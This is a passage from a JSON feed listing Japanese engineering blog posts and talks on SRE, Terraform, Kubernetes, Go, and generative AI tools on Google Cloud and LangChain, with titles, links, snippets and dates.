株式会社スリーシェイク.","isoDate":"2024-11-08T04:00:52.000Z","dateMiliSeconds":1731038452000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREの前に","link":"https://speakerdeck.com/nwiizo/srenoqian-ni","contentSnippet":"2024年11月06日(水) 18:00～19:00の予定に遅刻してしまい、大変申し訳ございませんでした。お詫びとして、当初非公開予定であった資料を公開させていただきます。元々、公開する予定ではなかったので補足が足りない部分などあると思いますのでご容赦下さい。\\r\\rブログなどで補足情報出すかもなので気になればフォローしてください\\r- https://syu-m-5151.hatenablog.com/\\r- https://x.com/nwiizo\\r\\r\\rSREの前に - 運用の原理と方法論\\r公式URL: https://talent.supporterz.jp/events/2ed2656a-13ab-409c-a1d9-df8383be25fd/","isoDate":"2024-11-06T05:00:00.000Z","dateMiliSeconds":1730869200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Generative AI Summit Tokyo ’24 Fallに参加しました","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall-2/","contentSnippet":"Sreake事業部インターン生の荒木です。先日Generative AI Summit Tokyo ’24 Fallに参加してまいりました！本イベントで得られた知見や、セッションの様子などを紹介します。 内容 […]The post Generative AI Summit Tokyo ’24 Fallに参加しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T01:02:35.000Z","dateMiliSeconds":1730768555000,"authorName":"Sreake","authorId":"Sreake"},{"title":"FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜","link":"https://sreake.com/blog/finops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 現在、さまざまな業界の多種多様なシステムにおいて、クラウドサービス\xad\xadが広く活用されています。 クラウドネイティブなシステムは、状況に応じて迅速に構築できること、柔軟にスケールできること等の利点がある一方 […]The post FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:54.000Z","dateMiliSeconds":1730434134000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%83%8d%e3%82%a4%e3%83%86%e3%82%a3%e3%83%96%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに クラウドネイティブとは、クラウドの特性を最適に活用することを目指すアプローチや考え方のことです。 2006年にクラウドコンピューティングという言葉が誕生し、インターネット技術を利用してサービスを提供するコ […]The post クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:34.000Z","dateMiliSeconds":1730434114000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜","link":"https://sreake.com/blog/platform-engineering/","contentSnippet":"1. はじめに Platform Engineeringとは、開発ポータルなどの共通的なツールやサービスを高度に整備し、開発者体験(DevEx)とソフトウェアデリバリの生産性を向上させるための取り組みです。 これは、企業 […]The post Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:14.000Z","dateMiliSeconds":1730434094000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Gateway API 入門","link":"https://zenn.dev/tayusa/articles/786e3c11e631fe","contentSnippet":"ちょうど1年前にGAとなったKubernetesのGateway APIを触る機会がなかったので、個人的に理解を深めるようと思います。https://kubernetes.io/blog/2023/10/31/gateway-api-ga/ Gateway API とは？L4とL7ルーティングを担う次世代のKubernetes Ingress、Load Balancing、Service Mesh APIsです。汎用的で表現力があり役割が分離できるように設計されています。役割指向Kubernetesのサービスネットワークの利用と設定を行う組織の役割を表現したAPIリソースに...","isoDate":"2024-10-31T02:57:25.000Z","dateMiliSeconds":1730343445000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"WebサイトやGitHubソースコードを処理 (ハンズオン)","link":"https://shu-kob.hateblo.jp/entry/2024/10/29/190456","contentSnippet":"#7 WebサイトやGitHubソースコードを処理 (ハンズオン)【オンライン】 - connpassgenai-users.connpass.com勉強会の資料です。Google Cloudでクレデンシャルを取得IAMと管理 > サービスアカウント↓こちらの記事を参考shu-kob.hateblo.jp環境変数にセット以下はMacで、.zprofileの場合export GOOGLE_APPLICATION_CREDENTIALS=\\"/path/PROJECT_ID-XXXXXXXXXX.json\\"source ~/.zprofileソースコードを取得github.comgit clone https://github.com/shu-kob/genai-web-github-loadercd genai-web-github-loadernpm iWebページを読んで要約loadWebPages.tsで、プロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadWebPages.ts https://www.raumen.co.jp/rapedia/study_history/ソースコードの読み込んで仕様書を作成loadGitHubでプロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadGitHub.ts https://github.com/shu-kob/genai-web-github-loader","isoDate":"2024-10-29T10:04:56.000Z","dateMiliSeconds":1730196296000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cilium Node IPAM LBによるロードバランシング","link":"https://sreake.com/blog/cilium-node-ipam-lb-load-balancing/","contentSnippet":"はじめに Sreake事業部でインターンをしている小林です。 本記事では、Cilium v1.16で追加されたCilium Node IPAM LBを検証しました。 Ciliumのロードバランシング方法 CiliumでL […]The post Cilium Node IPAM LBによるロードバランシング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-28T05:08:45.000Z","dateMiliSeconds":1730092125000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TerraformをRenovateで自動バージョンアップし、PR作成とMergeを自動化する","link":"https://zenn.dev/takehiro1111/articles/renovate_description","contentSnippet":"1.Renovateとは？ドキュメントでAutomated dependency updates. Multi-platform and multi-language.と記載されています。簡潔に言うと依存関係を自動で更新してくれるツールです。バージョンアップしてくれ、PR作成~Mergeまで自動で行ってくれます。!reference:https://docs.renovatebot.com/ 2.Dependabotとの比較 Renovateを採用するメリットRenovateだと異なる種類の依存関係でも、プロジェクト単位で1つのPRにまとめてくれてPRの...","isoDate":"2024-10-21T15:37:54.000Z","dateMiliSeconds":1729525074000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KubernetesセキュリティDeep Dive","link":"https://sreake.com/blog/kubernetes-security-deep-dive/","contentSnippet":"自己紹介 高橋 楓 公立千歳科学技術大学理工学部2年の高橋楓です。普段は趣味や他社の長期インターンにてソフトウェア開発を行っており、インフラ基盤にはDockerを利用しています。しかし、KubernetesやGoogle […]The post KubernetesセキュリティDeep Dive first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-21T11:49:27.000Z","dateMiliSeconds":1729511367000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goの公開、非公開フィールドについて","link":"https://zenn.dev/kamos/articles/1897b2a80b49c0","contentSnippet":"Goにはjavaでいうreadonlyのような、フィールドの変更を制御するような文法が存在しません。そのためGoではフィールドの公開、非公開が非常に重要な役割を持っています。Goで不変を表現したい場合、非公開なフィールドをつくり、それのゲッターを使って値を参照することが推奨されていますこの記事では興味本位ですが、フィールドの公開、非公開に注目して、どういった挙動をするのかまとめました。 検証 基本形それぞれの公開、非公開のプリミティブ型のフィールドを持っている場合は以下のようになります。pkg/item.gppackage pkgtype Item struct {...","isoDate":"2024-10-19T16:26:12.000Z","dateMiliSeconds":1729355172000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Goのポインタをどう扱うべきか","link":"https://zenn.dev/kamos/articles/d6e79fc82abfaf","contentSnippet":"Goのポインタについて、結局どうやって使い分けたらいいんだっけ?となることがあったので、挙動を整理したうえで使い所をまとめてみました。 ポインタの挙動 基本的な挙動Goのポインタは、変数の値が格納されているメモリアドレスを指します。そのためポインタをPrintすると、その変数のメモリアドレスが表示されます。main.gofunc main() {\\tv := \\"Hello, World!\\" // v is a string\\tp := &v              // p is a pointer to v\\tfmt.Println(v)\\tfmt.Prin...","isoDate":"2024-10-19T07:03:56.000Z","dateMiliSeconds":1729321436000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men-340f58db-c1be-4877-92b9-7fbf1df3105e","contentSnippet":"https://genai-users.connpass.com/event/333130/\\rOSCオンラインで生成AIの基礎知識から、実際に活用できる技術まで、幅広く解説しました。\\r\\r生成AIとは何か、その仕組みを解説します。\\r生成AIモデルを比較し、具体的なユースケースを紹介します。\\rプロンプトエンジニアリング、RAG (Retrieval Augmented Generation)などの技術を説明します。\\rオープンソースライブラリLangChainについてご紹介します。\\r最後に生成AIが社会に与える影響や、今後の展望について考えます。","isoDate":"2024-10-19T04:00:00.000Z","dateMiliSeconds":1729310400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[Sidecar Containers] Pod Eviction 時のメッセージの改善","link":"https://zenn.dev/toversus/articles/d78254ad757094","contentSnippet":"はじめに先日 Kubernetes で報告されていたバグを修正する PR を送りました。その時に、今後 Kubernetes へのコントリビュートを考えている方の参考になればと思い、どう取り組んだか (Issue の読み解き方やローカル環境での再現、コードの修正、テストの追加などの一通りの流れ) を脳内ダンプして言語化してみました。それを社内向けに共有していたのですが、PR も無事にマージされたので、一部加筆修正して記事として公開します。Issue: [Sidecar Containers] Eviction message should account for the sid...","isoDate":"2024-10-14T07:39:56.000Z","dateMiliSeconds":1728891596000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Terraformを使ったECS停止時のカスタムSlack通知の実装","link":"https://zenn.dev/takehiro1111/articles/aws_event_ecs","contentSnippet":"1.記事を書いた理由業務でECSの異常停止時にSlackへ通知する仕組みを導入していますが、デフォルトの通知内容だと見辛く、エラーコードや停止理由の確認がAWSコンソールに慣れていない人には難しいという課題がありました 2.構成何らかの理由でECSが停止した際にEventBridgeで設定したルールでキャッチし、SNS,Chatbot経由でSlackへ通知する構成です。Lambdaでも実現出来るかと思いますが、今回は細かい要件を想定しておらず運用工数的にもChatbotで良い感じに通知してくれる構成にしています。クラスメソッドさんの記事を大変参考にさせていただきま...","isoDate":"2024-10-13T03:51:55.000Z","dateMiliSeconds":1728791515000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS] ステートファイルの切り替えコマンド","link":"https://zenn.dev/takehiro1111/articles/tfstate_switch","contentSnippet":"backend設定の切り替えbackendを別設定へ切り替える際は、コードの記述を変更して以下コマンドを実行します。例えば、Terraformで構築し始めの際にストレージを用意出来ていない場合に一時的にlocalに設定した後にS3に変更するケースで用います。切り替え前のファイルが不要な場合は、コマンド実行後に削除します。 切り替え前のファイルから切り替え後のファイルに既存内容をコピーする必要がある場合terraform init -migrate-state 切り替え前のファイルから切り替え後のファイルに既存内容をコピーしない場合terraform init ...","isoDate":"2024-09-16T13:05:31.000Z","dateMiliSeconds":1726491931000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS] ステートファイルの管理方法(local,s3,terragrunt等)","link":"https://zenn.dev/takehiro1111/articles/terraform_tfstate","contentSnippet":"本記事を読み終わった時のゴールステートファイルの概念、必要性を認識出来る事。状況に応じて適切なbackendの設定が出来る事。\xa0 目次ステートファイルの概要ステートファイルの構文,ロック機能の記述backend設定のパターン別解説backend設定の切り替え(例:local⇔S3)\xa0 本編 1. ステートファイルの説明 ステートファイルとは？Terraform管理下で実際に構築されているリソースのマッピング情報がJSONフォーマットで記述されるファイル。Terraformが内部的に使用するプライベートなAPIとして機能する。このファイ...","isoDate":"2024-09-16T13:05:30.000Z","dateMiliSeconds":1726491930000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS]インストール,初期設定","link":"https://zenn.dev/takehiro1111/articles/terraform_install","contentSnippet":"本記事を読み終わった時のゴールLinux/Macの何れかの環境にTerraformをインストール出来る事。Terraformの主要な管理コマンドをざっくり把握した状態。AWS CLI,HCLでAWS APIを呼び出せるよう適切に認証情報を設定できる事。\xa0 目次Terraformの概念実際にTerraformをインストールする(Mac/Linux)Terraformの主要な管理コマンドCLI,HCLでAWS APIを呼び出せるよう認証情報の設定\xa0 本編 1. Terraformの概念 Terraformとは？米企業の Hashicorp 社...","isoDate":"2024-09-16T13:05:29.000Z","dateMiliSeconds":1726491929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Google Cloud で生成 AI アプリを評価するアーキテクチャパターン","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-eval-arch","contentSnippet":"用語について オンライン評価とオフライン評価評価はそのタイミング、やり方によってオンライン評価とオフライン評価に分けられます。オンライン評価とは、システムやモデルが実際の運用中にリアルタイムで評価される手法です。オフライン評価は、事前に用意されたデータセットを使用し、システムやモデルの性能をテスト環境で評価する方法です。生成 AI アプリケーションの場合には、オンライン評価は実際のユーザが生成 AI を利用した際の入出力に対して評価を行います。特徴としては、模範解答を用意することができないため生成 AI による評価（LLM as a Judge）をします。オフライン評...","isoDate":"2024-09-15T13:36:11.000Z","dateMiliSeconds":1726407371000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloud でのプロンプト管理は Vertex AI Studio を使おう","link":"https://zenn.dev/kimitsu/articles/google-cloud-temporary-prompt-version-management","contentSnippet":"背景Google Cloud では Google Cloud Next \'24 にて Vertex AI Studio の Prompt Version Management とその SDK Support が発表されました。[1]将来的には Google Cloud におけるプロンプト管理はこの機能を使うことになると思われますが、本記事執筆時点では SDK Support は公開されていません。そのため現時点で Google Cloud でプロンプトを管理するのにどのサービスを使うべきか検討した結果を共有します。検討にあたっては以下の観点を考慮しました。バージョン管理機...","isoDate":"2024-09-14T15:52:30.000Z","dateMiliSeconds":1726329150000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"AIを用いたOCR","link":"https://shu-kob.hateblo.jp/entry/2024/09/11/223456","contentSnippet":"OCRとは、Optical Character Recognitionの略で、日本語では光学文字認識といいます。OCRとは何か？OCRは、スキャンした書類や画像に含まれる文字を、コンピュータが読み取り、テキストデータに変換する技術です。つまり、紙に書かれた文字をデジタルの文字に変えて、パソコンで編集したり、検索したりできるようにするものです。OCRの仕組み画像の取り込み: スキャナーやデジタルカメラで、文字が書かれた紙の画像を撮影します。画像の前処理: 画像のノイズ除去や歪みの修正など、文字認識を円滑に行うための処理を行います。文字の切り出し: 画像から文字を一つずつ切り出します。文字の認識: 切り出した文字を、事前に登録された文字のパターンと照合し、どの文字か判定します。テキストデータへの変換: 認識された文字を、テキストデータに変換します。OCRの活用例書類のデジタル化: 紙の書類をスキャンしてテキストデータに変換することで、電子化し、保管や検索を効率化できます。データ入力の自動化: 請求書や領収書などの文字情報を自動的に読み込むことで、データ入力の手間を大幅に削減できます。検索の効率化: テキストデータに変換された文書は、キーワード検索が可能になり、必要な情報に素早くアクセスできます。翻訳: OCRでテキストデータに変換した後に、翻訳ソフトウェアを使って他の言語に翻訳することができます。OCRのメリット作業の効率化: 手作業でのデータ入力に比べて、大幅に作業時間を短縮できます。正確性の向上: 人による入力ミスを減らすことができ、データの正確性を高めます。コスト削減: 人件費の削減につながります。ペーパーレス化: 紙の書類を電子化することで、保管スペースを削減し、環境にも優しいです。OCRの種類OCRには、大きく分けて以下の2種類があります。OCRエンジン: ソフトウェア開発者が、OCR機能を自社のアプリケーションに組み込むために利用するソフトウェアです。OCRサービス: クラウド上で提供されるOCR機能で、APIなどを利用して簡単にOCR機能を導入できます。OCRの選び方OCRを選ぶ際には、以下の点に注意しましょう。認識精度: どの程度の精度で文字を認識できるか。対応言語: どの言語に対応しているか。対応フォント: どのフォントに対応しているか。対応ファイル形式: どのファイル形式に対応しているか。価格: 有料か無料か、料金体系はどうか。AIを用いたOCRcloud.google.comGoogle CloudなどパブリッククラウドでOCR機能が提供されています。Geminiで使用することもできます。OCRの活用の幅が広がり、工数削減に役立ちそうですね。まとめOCRは、紙の文書をデジタル化し、業務効率化に貢献する便利な技術です。様々な分野で活用されており、今後もその重要性はますます高まっていくでしょう。","isoDate":"2024-09-11T13:34:56.000Z","dateMiliSeconds":1726061696000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Apple Intelligence触ってみたい","link":"https://shu-kob.hateblo.jp/entry/2024/09/10/235654","contentSnippet":"k-tai.watch.impress.co.jpiPhone16で、Apple Intelligenceという名の生成AIが搭載されるようですね。Xなどではいまいち、盛り上がりに欠けているものの、生成AIを生業にするものとしては、触ってみたいです。Google PixelがGeminiを搭載したAIスマホとして売り出されていますが、iPhone・Apple Watch・Macユーザとしては、引き続きiPhoneですかね。Geminiは好きなので、Google Pixel欲しい気もしますがww","isoDate":"2024-09-10T14:56:54.000Z","dateMiliSeconds":1725980214000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"生成 AI アプリで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/gen-ai-telemetry","contentSnippet":"2024 年現在、生成 AI のアプリケーションへの応用が進んでおり^{[要出典]}、運用のためのツールやサービスが登場しています。生成 AI 専用のサービスとしては LangSmith と Langfuse が有名で、それぞれモデルへの入出力やトレースなどを取ることができます。監視 SaaS である Datadog でも LLM Observability の機能がリリースされています。また先月末には Google Cloud のブログにて GenOps についての記事が投稿され、その中でロギングや評価についての記載もありました。https://cloud.google.com...","isoDate":"2024-09-08T03:11:06.000Z","dateMiliSeconds":1725765066000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google の提唱する GenOps って何？","link":"https://zenn.dev/kimitsu/articles/what-is-genops","contentSnippet":"2024 年 8 月 31 日に Google Cloud のブログにて「GenOps: learning from the world of microservices and traditional DevOps」という記事が投稿されました。https://cloud.google.com/blog/products/devops-sre/genops-learnings-from-microservices-and-traditional-devopsこれまでも LangSmith や Langfuse といった LLMOps ツールや Datadog の LLM Observ...","isoDate":"2024-09-07T07:59:59.000Z","dateMiliSeconds":1725695999000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"生成AIにおけるベクトルインデックス","link":"https://shu-kob.hateblo.jp/entry/2024/09/06/234850","contentSnippet":"生成AIにおけるベクトルインデックス：詳細解説ベクトルインデックスとは？ベクトルインデックスは、生成AIにおいて、テキスト、画像、音声などの非構造化データを、数値のベクトルに変換し、そのベクトル間の類似度に基づいて検索や推薦を行うための技術です。なぜベクトルに変換するのか？意味の理解: 単語の並びだけでなく、単語間の関係性や文脈を数値として表現することで、コンピュータがより深くテキストの意味を理解できるようになります。高速な検索: 高次元空間上のベクトル間の距離を計算することで、従来のキーワード検索よりも高速かつ正確に類似したデータを検索できます。多様なデータの統合: テキストだけでなく、画像や音声などもベクトルに変換することで、異なる種類のデータを統一的に扱うことができます。ベクトルインデックスの仕組みベクトル化: テキストや画像などを、ニューラルネットワークなどのモデルを用いて数値のベクトルに変換します。インデックス作成: 変換されたベクトルを、効率的に検索できるようにインデックスを作成します。ベクトル検索: ユーザーのクエリをベクトル化し、作成されたインデックスから最も類似したベクトルを検索します。ベクトルインデックスの活用事例検索エンジン: キーワードだけでなく、文章の意味に基づいたより精度の高い検索を実現します。推薦システム: ユーザーの興味関心に基づいた商品やコンテンツを推薦します。チャットボット: ユーザーの質問に対して、より自然な回答を生成します。画像検索: 画像の内容に基づいた検索や、類似画像の検索を行います。ベクトルインデックスのメリット高精度な検索: キーワードマッチングだけでなく、意味に基づいた検索が可能になります。柔軟なデータ処理: テキストだけでなく、画像や音声など、様々な種類のデータを扱えます。スケーラビリティ: 大量のデータを効率的に処理できます。ベクトルインデックスの課題次元数の呪い: 高次元空間での計算コストが大きくなることがあります。モデルの選択: どのモデルを用いてベクトルに変換するかが、性能に大きく影響します。解釈の難しさ: ベクトル表現が抽象的であり、人間が直感的に理解することが難しい場合があります。今後の展望ベクトルインデックスは、生成AIのさらなる発展に不可欠な技術です。より大規模なデータセットへの対応、より高精度なベクトル化モデルの開発、そして、ベクトル表現の解釈に関する研究が進められていくことが期待されます。具体的な活用事例eコマース: ユーザーの過去の購入履歴や検索履歴に基づいた商品推薦カスタマーサポート: チャットボットによるFAQ検索や、ユーザーの問い合わせに対する自動応答医療: 医療論文の検索や、診断支援金融: リスク評価や不正検知まとめベクトルインデックスは、生成AIの性能を飛躍的に向上させるための重要な技術です。様々な分野での応用が期待されており、今後もその重要性はますます高まっていくでしょう。さらに詳しく知りたい場合は、以下のキーワードで検索してみてください。ベクトルデータベースベクトル検索自然言語処理機械学習ニューラルネットワーク何か他に聞きたいことがあれば、お気軽にご質問ください。より具体的な質問の例:特定のベクトルデータベースについて詳しく知りたいベクトルインデックスを構築する際の注意点ベクトルインデックスを生成AIの開発にどのように活用できるかこれらの質問に対して、より詳細な情報を提供できます。","isoDate":"2024-09-06T14:48:50.000Z","dateMiliSeconds":1725634130000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU + Ollama gemma2 のパフォーマンスを図ってみる","link":"https://zenn.dev/satohjohn/articles/912b4c718a8d74","contentSnippet":"概要Google Cloud 上で申請することで、Cloud Run GPU が使えるようになったので実行してみます。https://cloud.google.com/run/docs/configuring/services/gpu?hl=ja申請フォームGoogle Cloud では以下のように、サンプルが載っているので一旦それの通りの沿って、Gemma2 を起動するアプリケーションを作成します。https://cloud.google.com/run/docs/tutorials/gpu-gemma2-with-ollama?hl=jaとはいえ、それだけだとそのまま...","isoDate":"2024-09-06T08:31:03.000Z","dateMiliSeconds":1725611463000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Scala アプリケーションのビルドを改善してデプロイ時間を 1/4 にした話 | How I improved the build of my Scala application and reduced deployment time by 4x","link":"https://speakerdeck.com/nomadblacky/scala-ahurikesiyonnohirutowogai-shan-sitetehuroishi-jian-wo-1-4-nisitahua-how-i-improved-the-build-of-my-scala-application-and-reduced-deployment-time-by-4x","contentSnippet":"2024/09/06 Scalaわいわい勉強会 #3\\rhttps://scala-tokyo.connpass.com/event/325327/","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"2024年版 運用者たちのLLM","link":"https://speakerdeck.com/nwiizo/2024nian-ban-yun-yong-zhe-tatinollm","contentSnippet":"Cloud Operator Days 2024 クロージングイベント\\rhttps://cloudopsdays.com/closing/\\r\\rとても、端的に言うと「プロンプトエンジニアリングをしよう」って話。\\rこの発表資料は、LLM（大規模言語モデル）によるIT運用の可能性と課題を探っています。AIOpsの概念を基に、LLMがインシデント対応、ドキュメンテーション、コード分析などの運用タスクをどのように改善できるかを説明しています。同時に、LLMの「幻覚」や不完全性といった課題も指摘し、適切な利用方法やプロンプトエンジニアリングの重要性を強調しています。\\r\\r登壇時ブログ\\rhttps://syu-m-5151.hatenablog.com/entry/2024/09/06/154607","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Gemini向けの生成AIのプロンプトエンジニアリング","link":"https://shu-kob.hateblo.jp/entry/2024/09/05/235035","contentSnippet":"cloud.google.com生成AIのプロンプトエンジニアリングは様々な手法がありますが、Gemini for Google Cloudなんて出ているのですね。Google Cloud のプロダクトとサービスに関しては、Geminiは学習済のようで、詳しいようです。読んで勉強したいと思います。","isoDate":"2024-09-05T14:50:35.000Z","dateMiliSeconds":1725547835000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Mini-Omni OSSでSpeech-to-Speechができるようになる？","link":"https://shu-kob.hateblo.jp/entry/2024/09/04/233919","contentSnippet":"arxiv.orgGPT-4oの進化系で、リアルタイム音声会話のできる生成AIがOSSで出たようです。github.comその名もMini-Omni。小型モデルでどうリアルタイム音声会話を実現したのか興味深いですね。生成AIでリアルタイム音声会話は難しく、Speech-to-Text-to-Speechという変換手順を踏む必要があり、時間がかかっていたところ、リアルタイム、つまりSpeech-to-Speechで早く処理できるようになった、ということですね。ぜひ論文を読んでみたいと思います。以下、AbstractをGeminiで訳してみました。（OpenAIちゃうんかいw）言語モデルの進歩とMini-Omni言語モデルの最近の進歩は、大きな成果を上げています。GPT-4oは新たなマイルストーンとして、人間とのリアルタイム会話が可能となり、人間に近い自然な流暢さを示しています。このような人間とコンピュータのインタラクションを実現するには、音声モダリティで直接推論を行い、ストリーミングで出力生成できるモデルが必要となります。しかし、これは現在の学術的なモデルではまだ実現できていません。これらのモデルは通常、音声合成のために追加のTTSシステムに依存しており、望ましくない遅延が生じます。本論文では、リアルタイム音声インタラクションが可能なオーディオベースのエンドツーエンド会話モデルであるMini-Omniを紹介します。この機能を実現するために、テキスト指示による音声生成方法と、推論時のバッチ並列戦略を提案しています。この手法は、元のモデルの言語能力を最小限の劣化で保持するのに役立ち、他の研究がリアルタイムインタラクション機能を確立できるようにします。このトレーニング方法を「Any Model Can Talk」と呼んでいます。また、音声出力を最適化したモデルをファインチューニングするためのVoiceAssistant-400Kデータセットも紹介します。私たちの知る限り、Mini-Omniはリアルタイム音声インタラクションのための最初の完全なエンドツーエンド、オープンソースモデルであり、今後の研究に貴重な可能性を提供します。","isoDate":"2024-09-04T14:39:19.000Z","dateMiliSeconds":1725460759000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloudの生成AIサンプルアプリEnterprise Knowledge Solution (EKS)","link":"https://shu-kob.hateblo.jp/entry/2024/09/03/235705","contentSnippet":"github.comGoogle Cloudの生成AIサンプルアプリ「Enterprise Knowledge Solution」 (EKS)がGitHubで公開されています。EKSはAmazon Elastic Kubernetes Serviceと紛らわしい（苦笑）「Enterprise Knowledge Solution」 はIAPとCloud RunベースでUI付きの生成AIアプリケーションをさっとデプロイできるようです。私はまだ試せていないですが、是非とも触ってみたいですね。terraformでデプロイできる模様。これは面白そう。コードも参考になりそうですね。","isoDate":"2024-09-03T14:57:05.000Z","dateMiliSeconds":1725375425000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChain Meetup Tokyo #2に登壇し、LangChainでWebサイトの内容取得やGitHubソースコード取得、というタイトルで発表しました","link":"https://shu-kob.hateblo.jp/entry/2024/09/02/224106","contentSnippet":"langchain.connpass.comLangChain Meetup Tokyo #2に登壇してきました。私は「LangChainでWebサイトの内容取得やGitHubソースコード取得」というタイトルで発表しました！次は @shu_kob によるLangChainでWebサイトの内容取得やGitHubソースコード取得\uD83D\uDC4F #LangChainJP pic.twitter.com/ryvFxqv6M1— こぎそ | Algomatic (@kgsi) 2024年9月2日   写真撮っていただけてました。ありがとうございます。ChatGPT/LangChainによるチャットシステム構築［実践］入門作者:吉田 真吾,大嶋 勇樹技術評論社Amazon「ChatGPT/LangChainによるチャットシステム構築［実践］入門」の著者、吉田 真吾さん、大嶋 勇樹さんにもお会いできました。お二人の会社、株式会社ジェネラティブエージェンツのCEO西見公宏さんにもお会いでき、コロッケそばさん、技術者としてステキ‼️ #langchainjp pic.twitter.com/N1GE4ArjJ0— \uD835\uDE4E\uD835\uDE5D\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\uD835\uDE64 吉田真吾 (@yoshidashingo) 2024年9月2日   65歳で登壇されたコロッケそばさんかっこよかったです！ speakerdeck.com↑私の資料はこちらにアップロードしています。様々な学びがあり、もっと生成AIを頑張ろう、と思えた刺激的なMeetupでした！","isoDate":"2024-09-02T13:41:06.000Z","dateMiliSeconds":1725284466000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでWebサイトの内容取得やGitHubソースコード取得","link":"https://speakerdeck.com/shukob/langchaindewebsaitononei-rong-qu-de-yagithubsosukodoqu-de","contentSnippet":"https://langchain.connpass.com/event/329185/\\r\\rLangChainでは、Webサイトの内容取得やGitHubソースコード取得もできます。\\r使用してみた所感も交えてこれらの機能のご紹介をします。","isoDate":"2024-09-02T04:00:00.000Z","dateMiliSeconds":1725249600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Project IDX での Web アプリケーション開発","link":"https://zenn.dev/satohjohn/articles/4e7a1e5e3140e1","contentSnippet":"概要Project IDX (以下 IDX) は Google Cloud の Cloud Workstations をベースに Google がホストする仮想実装環境を提供してくれるサービスになります。https://idx.dev/PWA 対応しているため、install して利用することが可能です。（私は、 https://open-vsx.org/extension/k--kato/intellij-idea-keybindings こちらの extensions を利用しているため keybind を考えると install したほうが扱いやすいというのがあります)...","isoDate":"2024-09-02T03:41:10.000Z","dateMiliSeconds":1725248470000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"LangChainでgithubリポジトリのソースコードを読む方法","link":"https://shu-kob.hateblo.jp/entry/2024/09/01/235529","contentSnippet":"shu-kob.hateblo.jp昨日の記事に関連して、今回はLangChainでgithubリポジトリのソースコードを読む方法です。github.com↑サンプルソースコードを載せています。js.langchain.com↑使い方はこちら実行例npx ts-node githubLoader.ts https://github.com/shu-kob/langchain-sample-codeDocument {  pageContent: \\"import { CheerioWebBaseLoader } from \'@langchain/community/document_loaders/web/cheerio\'\\\\n\\" +    \\"import { RecursiveCharacterTextSplitter } from \'@langchain/textsplitters\'\\\\n\\" +    \\"import { HtmlToTextTransformer } from \'@langchain/community/document_transformers/html_to_text\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  const loader = new CheerioWebBaseLoader(url)\\\\n\' +    \'  const docs = await loader.load()\\\\n\' +    \\"  const splitter = RecursiveCharacterTextSplitter.fromLanguage(\'html\')\\\\n\\" +    \'  const transformer = new HtmlToTextTransformer()\\\\n\' +    \'  const sequence = splitter.pipe(transformer)\\\\n\' +    \'  const newDocuments = await sequence.invoke(docs)\\\\n\' +    \\"  